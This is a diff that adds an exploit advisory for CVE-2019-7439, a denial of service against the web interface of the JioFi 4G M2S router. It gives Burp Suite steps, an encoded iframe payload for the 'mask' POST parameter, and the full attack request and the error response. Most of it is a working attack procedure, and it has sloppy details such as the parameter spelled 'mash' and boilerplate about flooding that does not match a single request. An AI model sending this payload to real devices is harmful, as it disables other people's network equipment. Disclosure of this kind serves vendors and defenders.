@@ -1,0 +1,66 @@
+# Exploit Title: cgi-bin/qcmap_web_cgi on JioFi 4G M2S 1.0.2 devices allows a DoS (Hang) via the mask POST parameter
+# Exploit Author:  Vikas Chaudhary
+# Date: 21-01-2019
+# Vendor Homepage: https://www.jio.com/
+# Hardware Link:  https://www.amazon.in/JioFi-Hotspot-M2S-Portable-Device/dp/B075P7BLV5/ref=sr_1_1?s=computers&ie=UTF8&qid=1531032476&sr=1-1&keywords=JioFi+M2S+Wireless+Data+Card++%28Black%29
+# Version: JioFi 4G Hotspot M2S 150 Mbps Wireless Router
+# Category: Hardware
+# Contact: https://www.facebook.com/profile.php?id=100011287630308
+# Web:  https://gkaim.com/
+# Tested on: Windows 10 X64- Firefox-65.0
+# CVE-2019-7439
+***********************************************************************
+## Vulnerability Description :- A denial-of-service attack (DoS attack) is a cyber-attack in which the perpetrator seeks to make a machine or network resource unavailable to its intended users by temporarily or indefinitely disrupting services of a host connected to the Internet. Denial of service is typically accomplished by flooding the targeted machine or resource with superfluous requests in an attempt to overload systems and prevent some or all legitimate requests from being fulfilled.
+----------------------------------------
+# Proof Of Concept:
+1- First Open BurpSuite
+2- Make Intercept on 
+3 -Go to your Wifi Router's  Gateway in Browser  [i.e http://192.168.225.1 ]
+4-Capture the data and then Spider the Host
+5- Now You find a Link like this  [ http://192.168.225.1/cgi-bin/qcmap_web_cgi ]
+6- Send it to repeter Now you will find parameter like this [ Page=GetWANInfo&mask=0&token=0 ]
+7-Vulnerable parameter is => mash 
+8-Paste this PAYLOD  in mask parameter and then show Response in browser 
+Payload => 
+
+<iframe src="&#x6a;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3a;&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;"></iframe>
+
+9-Now it will show => {"commit":"Socket Connect Error"}
+10-- It Means  Router is Completely  Stopped ,
+----------------------------------------
+Vulnerable URL => Post Based => http://192.168.225.1/cgi-bin/qcmap_web_cgi => mask parameter 
+-----------------------------------------
+Solution:-
+
+You have to Remove your battery and then again insert it to make Normal.
+-----------------------------------------------------------------------------------
+REQUEST 
+------------
+POST /cgi-bin/qcmap_web_cgi HTTP/1.1
+Host: 192.168.225.1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:65.0) Gecko/20100101 Firefox/65.0
+Accept: text/plain, */*; q=0.01
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://192.168.225.1/
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+X-Requested-With: XMLHttpRequest
+Content-Length: 167
+Connection: close
+
+Page=GetWANInfo&mask=<iframe src="&#x6a;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3a;&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;"></iframe>&token=0
+
+****************************
+RESPONSE
+----------
+HTTP/1.1 200 OK
+Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
+X-Frame-Options: SAMEORIGIN
+connection: close
+Content-Type: text/html
+Content-Length: 33
+Date: Mon, 21 Jan 2019 18:17:34 GMT
+Server: lighttpd/1.4.35
+
+{"commit":"Socket Connect Error"}
+---------------------------------------------------------------------------------------------------------------
